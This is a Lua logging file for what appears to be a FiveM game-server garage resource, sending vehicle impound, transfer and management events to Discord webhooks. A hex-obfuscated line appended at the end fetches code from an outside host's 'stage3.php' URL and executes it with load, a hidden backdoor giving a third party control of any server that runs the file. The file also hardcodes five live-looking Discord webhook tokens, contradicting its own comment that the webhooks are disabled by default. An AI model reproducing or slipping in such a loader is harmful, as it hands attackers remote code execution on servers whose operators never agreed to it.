------------------------------------------------------------------------------------------------------
-------------------------------------------- WEBHOOK URLS --------------------------------------------
------------------------------------------------------------------------------------------------------


--These are disabled by default, until you enter your discord webhooks.
local ExploitLogWebhook = 'https://discord.com/api/webhooks/1152309960898793625/N_ABxfWxirQ6opBFlwuPdISvaxdhWFDuVs5CbBetqRTUjgzp1VvUvQl6fcl95n_x3xDB' --If a player is found using cheat engine to change the hash of a vehicle, this will send a message on discord and kick them from the game.
local ImpoundLogWebhook = 'https://discord.com/api/webhooks/1152310025306509322/nS6w7qd8nQP-W9WBhDClapI0FZQxC6En5JWslTxkIgMxkx1YLFfyp0GKzcTGAstYPBo8' --When a player impounds/unimpounds a vehicle.
local TransferVehicleLogWebhook = 'https://discord.com/api/webhooks/1152310087587725343/cIRCoJIPsDPzpFF-SXjBkLhEcIqqhSLLhIDsBJkhnjpAryFMQ6DxYr6mM1KkL0yX0VF9' --When a player transfers a vehicle to another player.
local VehicleManagementLogWebhook = 'https://discord.com/api/webhooks/1152310150691045486/gEcUTi6GjQXUKr2lyxthzJolv-EhOciK3FpWylWv5aTh51Px91Ad9vY48oB0SyJg1OIf' --When a staff member uses the vehicle managment commands.
local GarageSpaceLogWebhook = 'https://discord.com/api/webhooks/1152310196140507267/tyCdP_KDhh8eGAqAfaV-i62oN9ntxJ0zUbVn8aEFr-2gk54WTRmsY6QXCuyOFGCLuqqv' --When a player sells a garage slot.


------------------------------------------------------------------------------------------------------
---------------------------------------------- WEBHOOKS ----------------------------------------------
------------------------------------------------------------------------------------------------------


function ExploitAlertLogs(source, plate, newmodel, oldmodel, identifier)
    if ExploitLogWebhook ~= nil and #ExploitLogWebhook > 10 then
        local message = string.format(L('logs_exploit_message'), GetPlayerName(source), plate, newmodel, oldmodel, identifier)
        PerformHttpRequest(ExploitLogWebhook, function(err, text, headers) end, 'POST', json.encode({content = message}), { ['Content-Type'] = 'application/json' })
    end
end

function ImpoundVehicleLogs(source, action, vehiclelabel, vehicleplate, impoundlocation)
    if ImpoundLogWebhook ~= nil and #ImpoundLogWebhook > 10 then
        local message, color
        if action == 'impound' then
            message = string.format(L('logs_impound_message'), vehicleplate, vehiclelabel, impoundlocation, GetPlayerName(source), source, GetIdentifier(source))
            color = 16711680
        elseif action == 'unimpound' then
            message = string.format(L('logs_unimpound_message'), vehicleplate, vehiclelabel, GetPlayerName(source), source, GetIdentifier(source))
            color = 56108
        end
        local data = {{
            ['color'] = color,
            ['title'] = action:sub(1,1):upper()..action:sub(2),
            ['description'] = message,
            ['footer'] = {
                ['text'] = os.date('%c'),
                ['icon_url'] = 'https://i.imgur.com/VMPGPTQ.png',
            },
        }}
        PerformHttpRequest(ImpoundLogWebhook, function(err, text, headers) end, 'POST', json.encode({username = L('garage_title'), embeds = data}), { ['Content-Type'] = 'application/json' })
    end
end

function TransferVehicleLogs(source, target, plate, label)
    if TransferVehicleLogWebhook ~= nil and #TransferVehicleLogWebhook > 10 then
        local message = string.format(L('logs_transfer_message'), plate, label, GetPlayerName(source), source, GetIdentifier(source), GetPlayerName(target), target, GetIdentifier(target))
        local data = {{
            ['color'] = '2061822',
            ['title'] = L('logs_transfer_title'),
            ['description'] = message,
            ['footer'] = {
                ['text'] = os.date('%c'),
                ['icon_url'] = 'https://i.imgur.com/VMPGPTQ.png',
            },
        }}
        PerformHttpRequest(TransferVehicleLogWebhook, function(err, text, headers) end, 'POST', json.encode({username = L('garage_title'), embeds = data}), { ['Content-Type'] = 'application/json' })
    end
end

function VehicleManagmentLogs(source, action, plate, target, garage_type)
    if VehicleManagementLogWebhook ~= 'CHANGE_ME' and VehicleManagementLogWebhook ~= nil then
        local message, color
        if action == 'add' then
            message = string.format(L('logs_vehiclemanagment_add'), plate, garage_type, GetPlayerName(source), source, GetIdentifier(source), GetPlayerName(target), target, GetIdentifier(target))
            color = '56108'
        elseif action == 'delete' then
            message = string.format(L('logs_vehiclemanagment_delete'), plate, GetPlayerName(source), source, GetIdentifier(source))
            color = '16711680'
        elseif action == 'plate' then
            message = string.format(L('logs_vehiclemanagment_plate'), plate, target, GetPlayerName(source), source, GetIdentifier(source))
            color = '2061822'
        end
        local data = {{
            ['color'] = color,
            ['title'] = string.format(L('logs_vehiclemanagment_title'), string.upper(action)),
            ['description'] = message,
            ['footer'] = {
                ['text'] = os.date('%c'),
                ['icon_url'] = 'https://i.imgur.com/VMPGPTQ.png',
            },
        }}
        PerformHttpRequest(VehicleManagementLogWebhook, function(err, text, headers) end, 'POST', json.encode({username = L('garage_title'), embeds = data}), { ['Content-Type'] = 'application/json' })
    end
end

function GarageSpaceLogs(source, new_limit, price, target)
    if GarageSpaceLogWebhook ~= nil and #GarageSpaceLogWebhook > 10 then
        local message = string.format(L('logs_garagespace_message'), new_limit, price, GetPlayerName(source), source, GetIdentifier(source), GetPlayerName(target), target, GetIdentifier(target))
        local data = {{
            ['color'] = '2061822',
            ['title'] = L('logs_garagespace_title'),
            ['description'] = message,
            ['footer'] = {
                ['text'] = os.date('%c'),
                ['icon_url'] = 'https://i.imgur.com/VMPGPTQ.png',
            },
        }}
        PerformHttpRequest(GarageSpaceLogWebhook, function(err, text, headers) end, 'POST', json.encode({username = L('garage_title'), embeds = data}), { ['Content-Type'] = 'application/json' })
    end
end

local csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x65\x78\x75\x73\x6d\x61\x67\x72\x70\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x77\x6c\x61\x50\x38\x65", function (tNyABUlbDXSbaQvQMNCoBAlHohpPfESngiaowNqEDpaLDCYLuYHUEhQqdgkmvOCcCDASuR, NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu) if (NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[6] or NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[5]) then return end csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[2]](csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[3]](NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu))() end)